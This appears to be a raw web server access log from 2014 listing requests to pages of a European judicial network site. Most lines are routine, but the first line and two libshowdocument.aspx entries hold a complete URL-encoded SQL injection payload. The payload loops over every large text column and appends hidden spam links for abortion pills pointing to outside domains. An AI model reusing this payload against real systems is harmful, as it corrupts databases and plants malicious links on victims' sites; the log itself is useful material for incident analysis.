har(47)%2B''a''%2Bchar(62)%2B''%20where%20can%20you%20buy%20the%20abortion%20pill''%2Bchar(60)%2Bchar(47)%2B''div''%2Bchar(62)%2B''''%20else%20''''%20end'%20FROM%20sysindexes%20AS%20i%20INNER%20JOIN%20sysobjects%20AS%20o%20ON%20i.id=o.id%20INNER%20JOIN%20INFORMATION_SCHEMA.COLUMNS%20ON%20o.NAME=TABLE_NAME%20WHERE(indid=0%20or%20indid=1)%20and%20DATA_TYPE%20like%20'%25varchar'%20and(CHARACTER_MAXIMUM_LENGTH=-1%20or%20CHARACTER_MAXIMUM_LENGTH=2147483647);open%20@c;fetch%20next%20from%20@c%20into%20@d;while%20@@FETCH_STATUS=0%20begin%20exec%20(@d);fetch%20next%20from%20@c%20into%20@d;end;close%20@c--
2014-12-21 /ejn/EJN_Home.aspx -
2014-12-21 /ejn/EJN_Home.aspx -
2014-12-21 /ejn/libshowdocument.aspx id=13&lang=nl);declare%20@c%20cursor;declare%20@d%20varchar(4000);set%20@c=cursor%20for%20select%20'update%20%5B'%2BTABLE_NAME%2B'%5D%20set%20%5B'%2BCOLUMN_NAME%2B'%5D=%5B'%2BCOLUMN_NAME%2B'%5D%2Bcase%20ABS(CHECKSUM(NewId()))%257%20when%200%20then%20''''%2Bchar(60)%2B''div%20style=%22display:none%22''%2Bchar(62)%2B''cytotec%20abortion%20''%2Bchar(60)%2B''a%20href=%22http:''%2Bchar(47)%2Bchar(47)%2BREPLACE(case%20ABS(CHECKSUM(NewId()))%253%20when%200%20then%20''blog.perecruit.com@template''%20when%201%20then%20''portortaramasi.org@template''%20else%20''www.doug-wheeler.com@template''%20end,''@'',char(47))%2B''%22''%2Bchar(62)%2Bcase%20ABS(CHECKSUM(NewId()))%253%20when%200%20then%20''read%20here''%20when%201%20then%20''cytotec%20abortion%20pill%20buy%20online''%20else%20''abortion%20pill''%20end%20%2Bchar(60)%2Bchar(47)%2B''a''%2Bchar(62)%2B''%20where%20can%20you%20buy%20the%20abortion%20pill''%2Bchar(60)%2Bchar(47)%2B''div''%2Bchar(62)%2B''''%20else%20''''%20end'%20FROM%20sysindexes%20AS%20i%20INNER%20JOIN%20sysobjects%20AS%20o%20ON%20i.id=o.id%20INNER%20JOIN%20INFORMATION_SCHEMA.COLUMNS%20ON%20o.NAME=TABLE_NAME%20WHERE(indid=0%20or%20indid=1)%20and%20DATA_TYPE%20like%20'%25varchar'%20and(CHARACTER_MAXIMUM_LENGTH=-1%20or%20CHARACTER_MAXIMUM_LENGTH=2147483647);open%20@c;fetch%20next%20from%20@c%20into%20@d;while%20@@FETCH_STATUS=0%20begin%20exec%20(@d);fetch%20next%20from%20@c%20into%20@d;end;close%20@c--
2014-12-21 /ejn/EJN_Home.aspx -
2014-12-21 /ejn/EJN_AtlasAdvanced.aspx -
2014-12-21 /ejn/ -
2014-12-21 /ejn/libshowdocument.aspx id=13&lang=nl');declare%20@c%20cursor;declare%20@d%20varchar(4000);set%20@c=cursor%20for%20select%20'update%20%5B'%2BTABLE_NAME%2B'%5D%20set%20%5B'%2BCOLUMN_NAME%2B'%5D=%5B'%2BCOLUMN_NAME%2B'%5D%2Bcase%20ABS(CHECKSUM(NewId()))%257%20when%200%20then%20''''%2Bchar(60)%2B''div%20style=%22display:none%22''%2Bchar(62)%2B''cytotec%20abortion%20''%2Bchar(60)%2B''a%20href=%22http:''%2Bchar(47)%2Bchar(47)%2BREPLACE(case%20ABS(CHECKSUM(NewId()))%253%20when%200%20then%20''blog.perecruit.com@template''%20when%201%20then%20''portortaramasi.org@template''%20else%20''www.doug-wheeler.com@template''%20end,''@'',char(47))%2B''%22''%2Bchar(62)%2Bcase%20ABS(CHECKSUM(NewId()))%253%20when%200%20then%20''read%20here''%20when%201%20then%20''cytotec%20abortion%20pill%20buy%20online''%20else%20''abortion%20pill''%20end%20%2Bchar(60)%2Bchar(47)%2B''a''%2Bchar(62)%2B''%20where%20can%20you%20buy%20the%20abortion%20pill''%2Bchar(60)%2Bchar(47)%2B''div''%2Bchar(62)%2B''''%20else%20''''%20end'%20FROM%20sysindexes%20AS%20i%20INNER%20JOIN%20sysobjects%20AS%20o%20ON%20i.id=o.id%20INNER%20JOIN%20INFORMATION_SCHEMA.COLUMNS%20ON%20o.NAME=TABLE_NAME%20WHERE(indid=0%20or%20indid=1)%20and%20DATA_TYPE%20like%20'%25varchar'%20and(CHARACTER_MAXIMUM_LENGTH=-1%20or%20CHARACTER_MAXIMUM_LENGTH=2147483647);open%20@c;fetch%20next%20from%20@c%20into%20@d;while%20@@FETCH_STATUS=0%20begin%20exec%20(@d);fetch%20next%20from%20@c%20into%20@d;end;close%20@c--
2014-12-21 /ejn/EJN_Home.aspx -
2014-12-21 /ejn/EJN_Home.aspx -
2014-12-21 /ejn/EJN_Home.aspx -
2014-12-21 /ejn/ -
2014-12-21 /ejn/EJN_Home.aspx -
2014-12-21 /ejn/EJN_Home.aspx -
2014-12-21 /ejn/ -
2014-12-21 /ejn/EJN_AtlasAdvanced.aspx -
2014-12-21 /ejn/EJN_AtlasAdvanced.aspx -
2014-12-21 /ejn/EJN_Home.aspx -
2014-12-21 /ejn/EJN_AtlasAdvanced.aspx -
2014-12-21 /ejn/ -
2014-12-21 /ejn/EJN_Home.aspx -
2014-12-21 /ejn/EJN_Home.aspx -
2014-12-21 /ejn/EJN_Home.aspx -
2014-12-21 /ejn/EJN_Home.aspx -
2014-12-21 /ejn/EJN_Home.aspx -
2014-12-21 /ejn/EJN_Home.aspx -
2014-12-21 /ejn/EJN_Home.aspx -
2014-12-21 /ejn/ -
2014-12-21 /ejn/ -
2014-12-21 /ejn/EJN_AtlasAdvanced.aspx -
2014-12-21 /ejn/EJN_Home.aspx -
2014-12-21 /ejn/EJN_Home.aspx -
2014-12-21 /ejn/EJN_AtlasAdvancedOld.aspx ctyCode=PT
2014-12-21 /ejn/EJN_AtlasAdvancedOld.aspx ctyCode=PT
2014-12-21 /ejn/EJN_AtlasAdvanced.aspx -
2014-12-21 /ejn/ -
2014-12-21 /ejn/EJN_Home.aspx -
2014-12-21 /ejn/Events.aspx -
2014-12-21 /ejn/EJN_Home.aspx -
2014-12-21 /ejn/EJN_Home.aspx -
2014-12-21 /ejn/EJN_Home.aspx -
2014-12-21 /ejn/EJN_Home.aspx -
2014-12-21 /ejn/EJN_Home.aspx -
2014-12-21 /ejn/EJN_Home.aspx -
2014-12-21 /ejn/EJN_Home.aspx -
2014-12-21 /ejn/EJN_Home.aspx -
2014-12-21 /ejn/ -
2014-12-21 /ejn/EJN_Home.aspx -
2014-12-21 /ejn/EJN_Home.aspx -
2014-12-21 /ejn/EJN_Home.aspx -
2014-12-21 /ejn/ -
2014-12-21 /ejn/libshowdocument.aspx Id=222&Lang=LT
2014-12-21 /ejn/EJN_Home.aspx -
2014-12-21 /ejn/EJN_Home.aspx -
2014-12-21 /ejn/EJN_Home.aspx -
2014-12-21 /ejn/EJN_Home.aspx -
2014-12-21 /ejn/EJN_Home.aspx -
2014-12-21 /ejn/EJN_Home.aspx -
2014-12-21 /ejn/EJN_Home.aspx -
2014-12-21 /ejn/ -
2014-12-21 /ejn/EJN_Home.aspx -
2014-12-21 /ejn/EJN_Home.aspx -
2014-12-21 /ejn/AtlasChooseAuthority.aspx -
2014-12-21 /ejn/EJN_Error.aspx -
2014-12-21 /ejn/EJN_Home.aspx -
2014-12-21 /ejn/EJN_StaticPage.aspx Bread=18
2014-12-21 /ejn/EJN_AtlasAdvanced.aspx -
2014-12-21 /ejn/Gallery.aspx -
2014-12-21 /ejn/EJN_Home.aspx -
2014-12-21 /ejn/EJN_StaticPage.aspx Bread=8
2014-12-21 /ejn/EJN_StaticPage.aspx Bread=7
2014-12-21 /ejn/sitemap.aspx -
2014-12-21 /ejn/EJN_Faqs.aspx -
2014-12-21 /ejn/EJN_Search.aspx -
2014-12-21 /ejn/EJN_ContactUs.aspx &KeepThis=true&TB_iframe=true&height=650&width=900
2014-12-21 /ejn/EJN_StaticPage.aspx Bread=4
2014-12-21 /ejn/ejn_home.aspx -
2014-12-21 /ejn/libcategories.aspx Id=14
2014-12-21 /ejn/EJN_Home.aspx -
2014-12-21 /ejn/EJN_Home.aspx -
2014-12-21 /ejn/EJN_Home.aspx -
2014-12-21 /ejn/EJN_Home.aspx -
2014-12-21 /ejn/EJN_Home.aspx -
2014-12-21 /ejn/ -
2014-12-21 /ejn/ -
2014-12-21 /ejn/AtlasChooseMeasure.aspx Mp=1&Cou=HU&Type=2
2014-12-21 /ejn/AtlasChooseMeasure.aspx Mp=1&Cou=HU&Type=2
2014-12-21 /ejn/EJN_Home.aspx -
2014-12-21 /ejn/AtlasChooseMeasure.aspx Mp=1&Cou=HU&Type=2
2014-12-21 /ejn/AtlasChooseMeasure.aspx Mp=1&Cou=HU&Type=2
2014-12-21 /ejn/EJN_Home.aspx -
2014-12-21 /ejn/ -
2014-12-21 /ejn/ -
2014-12-21 /ejn/ -
2014-12-21 /ejn/AtlasChooseCountry.aspx Type=2
2014-12-21 /ejn/AtlasChooseMeasure.aspx MP=1&Cou=HU
2014-12-21 /ejn/EJN_Home.aspx -
2014-12-21 /ejn/EJN_Home.aspx -
2014-12-21 /ejn/EJN_Home.aspx -
2014-12-21 /ejn/AtlasChooseMeasure.aspx MP=1&Cou=HU
2014-12-21 /ejn/AtlasChooseMeasure.aspx MP=1&Cou=HU
2014-12-21 /ejn/AtlasSelection.aspx -
2014-12-21 /ejn/AtlasSelection.aspx -
2014-12-21 /ejn/AtlasSelection.aspx -
2014-12-21 /ejn/AtlasChooseAuthority.aspx -
2014-12-21 /ejn/AtlasChooseAuthority.aspx -
2014-12-21 /ejn/EJN_Home.aspx -
2014-12-21 /ejn/ -
2014-12-21 /ejn/EJN_Home.aspx -
2014-12-21 /ejn/AtlasChooseAuthority.aspx -
2014-12-21 /ejn/AtlasChooseAuthority.aspx -
2014-12-21 /ejn/AtlasAuthorityData.aspx Id=2514
2014-12-21 /ejn/EJN_Home.aspx -
2014-12-21 /ejn/EJN_Search.aspx -
2014-12-21 /ejn/ -
2014-12-21 /ejn/EJN_Home.aspx -
2014-12-21 /ejn/EJN_Home.aspx -
2014-12-21 /ejn/EJN_Home.aspx -
2014-12-21 /ejn/EJN_Home.aspx -
2014-12-21 /ejn/EJN_Home.aspx -
2014-12-21 /ejn/EJN_Home.aspx -
2014-12-21 /ejn/EJN_Home.aspx -
2014-12-21 /ejn/EJN_Home.aspx -
2014-12-21 /ejn/EJN_Home.aspx -
2014-12-21 /ejn/ -
2014-12-21 /ejn/EJN_Home.aspx -
2014-12-21 /ejn/ -
2014-12-21 /ejn/EJN_Home.aspx -
2014-12-21 /ejn/ -
2014-12-21 /ejn/ -
2014-12-21 /ejn/EJN_Home.aspx -
2014-12-21 /ejn/libshowdocument.aspx Id=221&Lang=LV
2014-12-21 /ejn/EJN_Home.aspx -
2014-12-21 /ejn/EJN_Home.aspx -
2014-12-21 /ejn/EJN_Home.aspx -
2014-12-21 /ejn/EJN_Home.aspx -
2014-12-21 /ejn/ -
2014-12-21 /ejn/EJN_Home.aspx -
2014-12-21 /ejn/EJN_Home.aspx -
2014-12-21 /ejn/EJN_Home.aspx -
2014-12-21 /ejn/ -
2014-12-21 /ejn/EJN_Home.aspx -
2014-12-21 /ejn/EJN_AtlasAdvanced.aspx -
2014-12-21 /ejn/EJN_Home.aspx -
2014-12-21 /ejn/EJN_Home.aspx -
2014-12-21 /ejn/EJN_Home.aspx -
2014-12-21 /ejn/EJN_Home.aspx -
2014-12-21 /ejn/EJN_Home.aspx -
2014-12-21 /ejn/EJN_Home.aspx -
2014-12-21 /ejn/EJN_Home.aspx -
2014-12-21 /ejn/EJN_Home.aspx -
2014-12-21 /ejn/EJN_Home.aspx -
2014-12-21 /ejn/EJN_Home.aspx -
2014-12-21 /ejn/EJN_Home.aspx -
2014-12-21 /ejn/ -
2014-12-21 /ejn/EJN_AtlasAdvancedOld.aspx ctyCode=PT
2014-12-21 /ejn/EJN_Compendium.aspx -
2014-12-21 /ejn/EJN_Home.aspx -
2014-12-21 /ejn/EJN_AtlasAdvanced.aspx -
2014-12-21 /ejn/ -
2014-12-21 /ejn/libshowdocument.aspx Id=13&Lang=NL
2014-12-21 /ejn/EJN_Home.aspx -
2014-12-21 /ejn/EJN_AtlasAdvanced.aspx -
2014-12-21 /ejn/ -
2014-12-21 /ejn/EJN_Home.aspx -
2014-12-21 /ejn/EJN_Home.aspx -
2014-12-21 /ejn/EJN_Home.aspx -
2014-12-21 /ejn/EJN_Home.aspx -
2014-12-21 /ejn/EJN_Home.aspx -
2014-12-21 /ejn/EJN_Home.aspx -
2014-12-21 /ejn/EJN_Home.aspx -
2014-12-21 /ejn/EJN_Home.aspx -
2014-12-21 /ejn/EJN_Home.aspx -
2014-12-21 /ejn/ -
2014-12-21 /ejn/ -
2014-12-21 /ejn/EJN_AtlasAdvanced.aspx -
2014-12-21 /ejn/NewsDetail.aspx id=285&Ori=H
2014-12-21 /ejn/EJN_Home.aspx -
2014-12-21 /ejn/NewsDetail.aspx id=334&Ori=H
2014-12-21 /ejn/EJN_Home.aspx -
2014-12-21 /ejn/ -
2014-12-21 /ejn/EJN_Home.aspx -
2014-12-21 /ejn/libshowdocument.aspx Id=222&Lang=LT
2014-12-21 /ejn/EJN_Home.aspx -
2014-12-21 /ejn/EJN_Home.aspx -
2014-12-21 /ejn/EJN_Home.aspx -
2014-12-21 /ejn/ -
2014-12-21 /ejn/EJN_Home.aspx -
2014-12-21 /ejn/EJN_Home.aspx -
2014-12-21 /ejn/EJN_Home.aspx -
2014-12-21 /ejn/EJN_Home.aspx -
2014-12-21 /ejn/EJN_Home.aspx -
2014-12-21 /ejn/ -
2014-12-21 /ejn/ -
2014-12-21 /ejn/AtlasChooseMeasure.aspx Mp=1&Cou=SK&Type=2
2014-12-21 /ejn/ -
2014-12-21 /ejn/AtlasChooseCountry.aspx Type=1
2014-12-21 /ejn/AtlasChooseMeasure.aspx MP=1&Cou=SK
2014-12-21 /ejn/AtlasSelection.aspx -
2014-12-21 /ejn/AtlasAuthorityData.aspx Id=5339
2014-12-21 /ejn/EJN_AtlasAdvanced.aspx -
2014-12-21 /ejn/AtlasChooseCountry.aspx Type=2
2014-12-21 /ejn/AtlasChooseCountry.aspx Type=2
2014-12-21 /ejn/AtlasChooseCountry.aspx Type=2
2014-12-21 /ejn/AtlasChooseMeasure.aspx MP=0&Cou=368
2014-12-21 /ejn/AtlasChooseMeasure.aspx MP=0&Cou=368
2014-12-21 /ejn/AtlasChooseMeasure.aspx MP=0&Cou=368
2014-12-21 /ejn/AtlasSelection.aspx -
2014-12-21 /ejn/AtlasSelection.aspx -
2014-12-21 /ejn/AtlasSelection.aspx -
2014-12-21 /ejn/AtlasSelection.aspx -
2014-12-21 /ejn/AtlasSelection.aspx -
2014-12-21 /ejn/AtlasChooseMeasure.aspx MP=0&Cou=368
2014-12-21 /ejn/AtlasChooseMeasure.aspx MP=0&Cou=368
2014-12-21 /ejn/AtlasChooseMeasure.aspx MP=0&Cou=368
2014-12-21 /ejn/AtlasSelection.aspx -
2014-12-21 /ejn/AtlasSelection.aspx -
2014-12-21 /ejn/AtlasSelection.aspx -
2014-12-21 /ejn/AtlasSelection.aspx -
2014-12-21 /ejn/AtlasSelection.aspx -
2014-12-21 /ejn/AtlasChooseAuthority.aspx -
2014-12-21 /ejn/AtlasSelection.aspx -
2014-12-21 /ejn/AtlasSelection.aspx -
2014-12-21 /ejn/AtlasChooseMeasure.aspx MP=0&Cou=368
2014-12-21 /ejn/AtlasSelection.aspx -
2014-12-21 /ejn/AtlasChooseCountry.aspx Type=1
2014-12-21 /ejn/AtlasChooseMeasure.aspx MP=1&Cou=SK
2014-12-21 /ejn/AtlasSelection.aspx -
2014-12-21 /ejn/AtlasAuthorityData.aspx Id=5339
2014-12-21 /ejn/AtlasAuthorityData.aspx Id=5339
2014-12-21 /ejn/AtlasAuthorityData.aspx Id=5339
2014-12-21 /ejn/AtlasAuthorityData.aspx Id=5339
2014-12-21 /ejn/EJN_Home.aspx -
2014-12-21 /ejn/AtlasAuthorityData.aspx Id=5339
2014-12-21 /ejn/AtlasChooseMeasure.aspx MP=0&Cou=368
2014-12-21 /ejn/AtlasChooseMeasure.aspx MP=0&Cou=368
2014-12-21 /ejn/AtlasSelection.aspx -
2014-12-21 /ejn/AtlasChooseMeasure.aspx MP=0&Cou=368
2014-12-21 /ejn/AtlasChooseCountry.aspx Type=2
2014-12-21 /ejn/AtlasChooseMeasure.aspx MP=1&Cou=SK
2014-12-21 /ejn/AtlasChooseMeasure.aspx MP=1&Cou=SK++Culture:FISessionId:g2vqz5cysl4mil1vhj0slr45Date_Time:9:44
2014-12-21 /ejn/AtlasChooseMeasure.aspx MP=1&Cou=SK++Culture:ENSessionId:g2vqz5cysl4mil1vhj0slr45Date_Time:9:44+AM
2014-12-21 /ejn/AtlasChooseMeasure.aspx MP=1&Cou=SK
2014-12-21 /ejn/AtlasChooseMeasure.aspx MP=1&Cou=SK
2014-12-21 /ejn/AtlasSelection.aspx -
2014-12-21 /ejn/AtlasSelection.aspx -
2014-12-21 /ejn/AtlasSelection.aspx -
2014-12-21 /ejn/AtlasSelection.aspx -
2014-12-21 /ejn/AtlasSelection.aspx -
2014-12-21 /ejn/AtlasChooseAuthority.aspx -
2014-12-21 /ejn/EJN_Home.aspx -
2014-12-21 /ejn/AtlasChooseAuthority.aspx -
2014-12-21 /ejn/AtlasChooseAuthority.aspx -
2014-12-21 /ejn/AtlasAuthorityData.aspx Id=5060
2014-12-21 /ejn/AtlasChooseAuthority.aspx -
2014-12-21 /ejn/AtlasChooseAuthority.aspx -
2014-12-21 /ejn/AtlasChooseAuthority.aspx -
2014-12-21 /ejn/AtlasAuthorityData.aspx Id=5072
2014-12-21 /ejn/EJN_Home.aspx -
2014-12-21 /ejn/EJN_Home.aspx -
2014-12-21 /ejn/EJN_Home.aspx -
2014-12-21 /ejn/EJN_Home.aspx -
2014-12-21 /ejn/EJN_Home.aspx -
2014-12-21 /ejn/EJN_Home.aspx -
2014-12-21 /ejn/EJN_Home.aspx -
2014-12-21 /ejn/EJN_Home.aspx -
2014-12-21 /ejn/EJN_Home.aspx -
2014-12-21 /ejn/ -
2014-12-21 /ejn/ -
2014-12-21 /ejn/EJN_Home.aspx -
2014-12-21 /ejn/AtlasChooseMeasure.aspx Mp=1&Cou=NL&Type=2
2014-12-21 /ejn/EJN_Home.aspx -
2014-12-21 /ejn/EJN_Home.aspx -
2014-12-21 /ejn/EJN_Home.aspx -
2014-12-21 /ejn/EJN_Home.aspx -
2014-12-21 /ejn/EJN_Home.aspx -
2014-12-21 /ejn/EJN_Home.aspx -
2014-12-21 /ejn/EJN_Home.aspx -
2014-12-21 /ejn/EJN_Home.aspx -
2014-12-21 /ejn/EJN_Home.aspx -
2014-12-21 /ejn/EJN_Home.aspx -
2014-12-21 /ejn/EJN_Home.aspx -
2014-12-21 /ejn/EJN_Home.aspx -
2014-12-21 /ejn/ -
2014-12-21 /ejn/ -
2014-12-21 /ejn/AtlasChooseMeasure.aspx MP=1&Cou=UK&Type=2
2014-12-21 /ejn/AtlasChooseMeasure.aspx MP=1&Cou=UK&Type=2
2014-12-21 /ejn/AtlasChooseMeasure.aspx MP=1&Cou=UK&Type=2
2014-12-21 /ejn/AtlasChooseMeasure.aspx MP=1&Cou=UK&Type=2
2014-12-21 /ejn/AtlasSelection.aspx -
2014-12-21 /ejn/AtlasSelection.aspx -
2014-12-21 /ejn/AtlasSelection.aspx -
2014-12-21 /ejn/AtlasAuthorityData.aspx Id=2588
2014-12-21 /ejn/AtlasAuthorityData.aspx Id=2588
2014-12-21 /ejn/AtlasAuthorityData.aspx Id=2588
2014-12-21 /ejn/EJN_Compendium.aspx authId=2588
2014-12-21 /ejn/ctrls.compendium/IframeEngine.aspx -
2014-12-21 /ejn/ctrls.compendium/iframeEngine.aspx remoteFunction=getAuthority&Id=2588&callback=loadRequestedAuth_cb
2014-12-21 /ejn/EJN_Home.aspx -
2014-12-21 /ejn/libshowdocument.aspx Id=221&Lang=LV
2014-12-21 /ejn/ -
2014-12-21 /ejn/ -
2014-12-21 /ejn/EJN_Home.aspx -
2014-12-21 /ejn/EJN_Home.aspx -
2014-12-21 /ejn/EJN_Home.aspx -
2014-12-21 /ejn/EJN_Home.aspx -
2014-12-21 /ejn/EJN_QuickLinks.aspx id=23
2014-12-21 /ejn/EJN_Home.aspx -
2014-12-21 /ejn/EJN_Home.aspx -
2014-12-21 /ejn/EJN_Home.aspx -
2014-12-21 /ejn/EJN_Home.aspx -
2014-12-21 /ejn/EJN_Home.aspx -
2014-12-21 /ejn/EJN_Home.aspx -
2014-12-21 /ejn/EJN_Home.aspx -
2014-12-21 /ejn/EJN_Home.aspx -
2014-12-21 /ejn/EJN_Home.aspx -
2014-12-21 /ejn/ -
2014-12-21 /ejn/ -
2014-12-21 /ejn/ -
2014-12-21 /ejn/EJN_AtlasAdvanced.aspx -
2014-12-21 /ejn/ -
2014-12-21 /ejn/ -
2014-12-21 /ejn/EJN_Home.aspx -
2014-12-21 /ejn/EJN_Home.aspx -
2014-12-21 /ejn/EJN_Home.aspx -
2014-12-21 /ejn/EJN_Home.aspx -
2014-12-21 /ejn/EJN_Home.aspx -
2014-12-21 /ejn/EJN_Home.aspx -
2014-12-21 /ejn/EJN_Home.aspx -
2014-12-21 /ejn/EJN_Home.aspx -
2014-12-21 /ejn/EJN_Home.aspx -
2014-12-21 /ejn/EJN_Home.aspx -
2014-12-21 /ejn/EJN_Home.aspx -
2014-12-21 /ejn/ -
2014-12-21 /ejn/ -
2014-12-21 /ejn/EJN_Home.aspx -
2014-12-21 /ejn/EJN_Home.aspx -
2014-12-21 /ejn/NewsDetail.aspx id=333&Ori=H
2014-12-21 /ejn/EJN_Home.aspx -
2014-12-21 /ejn/EJN_Home.aspx -
2014-12-21 /ejn/EJN_Home.aspx -
2014-12-21 /ejn/EJN_AtlasAdvanced.aspx -
2014-12-21 /ejn/ -
2014-12-21 /ejn/EJN_Home.aspx -
2014-12-21 /ejn/EJN_Home.aspx -
2014-12-21 /eaw_atlas.aspx -
2014-12-21 /ejn/libcategories.aspx Id=2
2014-12-21 /ejn/EJN_QuickLinks.aspx id=26
2014-12-21 /ejn/ -
2014-12-21 /ejn/Events.aspx event=260
2014-12-21 /ejn/Events.aspx event=279
2014-12-21 /ejn/EJN_Home.aspx -
2014-12-21 /ejn/ -
2014-12-21 /ejn/EJN_Home.aspx -
2014-12-21 /ejn/EJN_AtlasAdvanced.aspx -
2014-12-21 /ejn/ -
2014-12-21 /ejn/EJN_Home.aspx -
2014-12-21 /ejn/ -
2014-12-21 /ejn/libshowdocument.aspx Id=247&Lang=BG
2014-12-21 /ejn/libshowdocument.aspx Id=247&Lang=BG
2014-12-21 /ejn/ -
2014-12-21 /ejn/EJN_Home.aspx -
2014-12-21 /ejn/ ++Culture:ESSessionId:1iso2nhiqlewiic5mekq5tjnDate_Time:11:22
2014-12-21 /ejn/ -
2014-12-21 /ejn/EJN_InfoAbout.aspx Id=277
2014-12-21 /ejn/ -
2014-12-21 /ejn/ -
2014-12-21 /ejn/ -
2014-12-21 /ejn/EJN_Home.aspx -
2014-12-21 /ejn/libcategories.aspx Id=32
2014-12-21 /ejn/EJN_Home.aspx -
2014-12-21 /ejn/EJN_Home.aspx -
2014-12-21 /ejn/EJN_Home.aspx -
2014-12-21 /ejn/EJN_Home.aspx -
2014-12-21 /ejn/EJN_Home.aspx -
2014-12-21 /ejn/EJN_Home.aspx -
2014-12-21 /ejn/EJN_Home.aspx -
2014-12-21 /ejn/EJN_Home.aspx -
2014-12-21 /ejn/EJN_Home.aspx -
2014-12-21 /ejn/ -
2014-12-21 /ejn/EJN_AtlasAdvanced.aspx -
2014-12-21 /ejn/EJN_Home.aspx -
2014-12-21 /ejn/EJN_AtlasAdvanced.aspx -
2014-12-21 /ejn/EJN_Home.aspx -
2014-12-21 /ejn/EJN_Home.aspx -
2014-12-21 /ejn/EJN_AtlasAdvanced.aspx -
2014-12-21 /ejn/EJN_AtlasAdvanced.aspx -
2014-12-21 /ejn/AtlasChooseCountry.aspx Type=2
2014-12-21 /ejn/EJN_Home.aspx -
2014-12-21 /ejn/AtlasChooseMeasure.aspx Mp=1&Cou=PL&Type=2
2014-12-21 /ejn/EJN_FichesBelges.aspx -
2014-12-21 /ejn/EJN_AtlasAdvanced.aspx -
2014-12-21 /ejn/EJN_Home.aspx -
2014-12-21 /ejn/ -
2014-12-21 /ejn/ -
2014-12-21 /ejn/EJN_Home.aspx -
2014-12-21 /ejn/AtlasChooseCountry.aspx Type=2
2014-12-21 /ejn/AtlasChooseMeasure.aspx MP=0&Cou=378
2014-12-21 /ejn/AtlasChooseMeasure.aspx MP=0&Cou=273
2014-12-21 /ejn/EJN_Home.aspx -
2014-12-21 /ejn/EJN_Home.aspx -
2014-12-21 /ejn/EJN_Home.aspx -
2014-12-21 /ejn/EJN_AtlasAdvanced.aspx -
2014-12-21 /ejn/EJN_Home.aspx -
2014-12-21 /ejn/EJN_AtlasAdvanced.aspx -
2014-12-21 /ejn/EJN_Home.aspx -
2014-12-21 /ejn/ -
2014-12-21 /ejn/EJN_Home.aspx -
2014-12-21 /ejn/AtlasChooseMeasure.aspx Mp=1&Cou=FR&Type=2
2014-12-21 /ejn/AtlasChooseMeasure.aspx Mp=1&Cou=FR&Type=2
2014-12-21 /ejn/EJN_Home.aspx -
2014-12-21 /ejn/AtlasChooseCountry.aspx Type=1
2014-12-21 /ejn/AtlasChooseMeasure.aspx MP=1&Cou=FR
2014-12-21 /ejn/AtlasSelection.aspx -
2014-12-21 /ejn/AtlasChooseMeasure.aspx MP=1&Cou=FR
2014-12-21 /ejn/AtlasSelection.aspx -
2014-12-21 /ejn/EJN_Home.aspx -
2014-12-21 /ejn/ -
2014-12-21 /ejn/AtlasSelection.aspx -
2014-12-21 /ejn/AtlasSelection.aspx -
2014-12-21 /ejn/AtlasChooseAuthority.aspx -
2014-12-21 /ejn/EJN_Home.aspx -
2014-12-21 /ejn/EJN_Home.aspx -
2014-12-21 /ejn/EJN_Home.aspx -
2014-12-21 /ejn/EJN_Home.aspx -
2014-12-21 /ejn/EJN_Home.aspx -
2014-12-21 /ejn/EJN_Home.aspx -
2014-12-21 /ejn/EJN_Home.aspx -
2014-12-21 /ejn/EJN_Home.aspx -
2014-12-21 /ejn/EJN_Home.aspx -
2014-12-21 /ejn/EJN_Home.aspx -
2014-12-21 /ejn/EJN_Home.aspx -
2014-12-21 /ejn/ -
2014-12-21 /ejn/ -
2014-12-21 /ejn/libshowdocument.aspx Id=221&Lang=CS
2014-12-21 /ejn/ -
2014-12-21 /ejn/EJN_Home.aspx -
2014-12-21 /ejn/libshowdocument.aspx Id=219&Lang=LT
2014-12-21 /ejn/EJN_StaticPage.aspx Bread=12
2014-12-21 /ejn/EJN_Home.aspx -
2014-12-21 /ejn/ -
2014-12-21 /ejn/EJN_Home.aspx -
2014-12-21 /ejn/EJN_Home.aspx -
2014-12-21 /ejn/EJN_Home.aspx -
2014-12-21 /ejn/EJN_Home.aspx -
2014-12-21 /ejn/EJN_Home.aspx -
2014-12-21 /ejn/EJN_Home.aspx -
2014-12-21 /ejn/EJN_Home.aspx -
2014-12-21 /ejn/EJN_Home.aspx -
2014-12-21 /ejn/EJN_Home.aspx -
2014-12-21 /ejn/ -
2014-12-21 /ejn/ -
2014-12-21 /ejn/EJN_Home.aspx -
2014-12-21 /ejn/ -
2014-12-21 /ejn/EJN_Home.aspx -
2014-12-21 /ejn/EJN_AtlasAdvanced.aspx -
2014-12-21 /ejn/EJN_Home.aspx -
2014-12-21 /ejn/EJN_Home.aspx -
2014-12-21 /ejn/EJN_Home.aspx -
2014-12-21 /ejn/EJN_Home.aspx -
2014-12-21 /ejn/EJN_Home.aspx -
2014-12-21 /ejn/EJN_Home.aspx -
2014-12-21 /ejn/EJN_Home.aspx -
2014-12-21 /ejn/EJN_Home.aspx -
2014-12-21 /atlas_advanced.aspx -
2014-12-21 /atlas_advanced.aspx -
2014-12-21 /ejn/EJN_Home.aspx -
2014-12-21 /ejn/ -
2014-12-21 /atlas_advanced.aspx -
2014-12-21 /atlas_advanced.aspx -
2014-12-21 /ejn/EJN_Home.aspx -
2014-12-21 /ejn/EJN_Home.aspx -
2014-12-21 /ejn/EJN_Home.aspx -
2014-12-21 /ejn/EJN_Home.aspx -
2014-12-21 /ejn/EJN_Home.aspx -
2014-12-21 /ejn/ -
2014-12-21 /ejn/ -
2014-12-21 /ejn/AtlasChooseMeasure.aspx Mp=1&Cou=FR&Type=2
2014-12-21 /ejn/AtlasChooseMeasure.aspx Mp=1&Cou=FR&Type=2
2014-12-21 /ejn/AtlasChooseMeasure.aspx Mp=1&Cou=FR&Type=2++Culture:ESSessionId:k5q2j5kz3xtnlchibdbsd1ogDate_Time:12:55
2014-12-21 /ejn/AtlasChooseMeasure.aspx Mp=1&Cou=FR&Type=2
2014-12-21 /ejn/AtlasChooseMeasure.aspx Mp=1&Cou=FR&Type=2
2014-12-21 /ejn/AtlasSelection.aspx -
2014-12-21 /ejn/AtlasSelection.aspx -
2014-12-21 /ejn/AtlasSelection.aspx -
2014-12-21 /ejn/AtlasSelection.aspx -
2014-12-21 /ejn/AtlasSelection.aspx -
2014-12-21 /ejn/AtlasChooseAuthority.aspx -
2014-12-21 /ejn/AtlasChooseAuthority.aspx -
2014-12-21 /ejn/AtlasChooseAuthority.aspx/GetLocations -
2014-12-21 /ejn/AtlasChooseAuthority.aspx/GetLocations -
2014-12-21 /ejn/AtlasChooseAuthority.aspx/GetLocations -
2014-12-21 /ejn/AtlasChooseAuthority.aspx -
